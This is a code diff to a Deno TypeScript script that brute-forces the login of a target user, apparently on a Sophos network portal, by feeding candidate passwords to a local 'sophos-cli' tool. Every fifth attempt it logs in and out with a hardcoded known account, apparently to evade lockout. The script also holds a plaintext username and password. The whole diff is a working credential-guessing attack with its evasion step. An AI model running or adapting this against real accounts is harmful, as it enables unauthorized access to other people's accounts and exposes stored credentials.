@@ -1,7 +1,7 @@
 const username_known = "9919103015";
 const password_known = "052019UH";
 
-const username_to_find = "9919103003";
+const username_to_find = "19102156";
 
 const password_list: Array<string> = [
   "157030AR",
@@ -54,11 +54,45 @@ const password_list: Array<string> = [
   "199040AS"
 ];
 
-for (let i = 0; i < password_list.length; ) {
-  if ((i + 1) % 5 == 0) {
+console.log("LogIn Known: " + username_known + " : " + password_known + "\n");
+let p1 = Deno.run({
+  args: [
+    "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+    username_known,
+    password_known,
+    "login"
+  ]
+});
+// await its completion
+await p1.status();
+console.log(
+  "***********************************************************************"
+);
+
+console.log("LogOut Known " + username_known + " : " + password_known + "\n");
+let p2 = Deno.run({
+  args: [
+    "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+    username_known,
+    password_known,
+    "logout"
+  ]
+});
+// await its completion
+await p2.status();
+console.log(
+  "***********************************************************************"
+);
+
+let i = 0;
+let k = 0;
+
+while (k < password_list.length) {
+  if ((k + 1) % 5 == 0) {
+    console.log("LogIn Known: " + username_known + " : " + password_known + "\n");
     let p1 = Deno.run({
       args: [
-        "$USER/projects/sophos-cli/target/debug/sophos-cli",
+        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
         username_known,
         password_known,
         "login"
@@ -66,9 +100,14 @@ for (let i = 0; i < password_list.length; ) {
     });
     // await its completion
     await p1.status();
+    console.log(
+      "***********************************************************************"
+    );
+
+    console.log("LogOut Known " + username_known + " : " + password_known + "\n");
     let p2 = Deno.run({
       args: [
-        "$USER/projects/sophos-cli/target/debug/sophos-cli",
+        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
         username_known,
         password_known,
         "logout"
@@ -76,10 +115,15 @@ for (let i = 0; i < password_list.length; ) {
     });
     // await its completion
     await p2.status();
+    console.log(
+      "***********************************************************************"
+    );
+    k++;
   } else {
+    console.log("Trying Unknown " + username_to_find + " : " + password_list[i] + "\n");
     let p = Deno.run({
       args: [
-        "$USER/projects/sophos-cli/target/debug/sophos-cli",
+        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
         username_to_find,
         password_list[i],
         "login"
@@ -87,6 +131,10 @@ for (let i = 0; i < password_list.length; ) {
     });
     // await its completion
     await p.status();
+    console.log(
+      "***********************************************************************"
+    );
     i++;
+    k++;
   }
 }
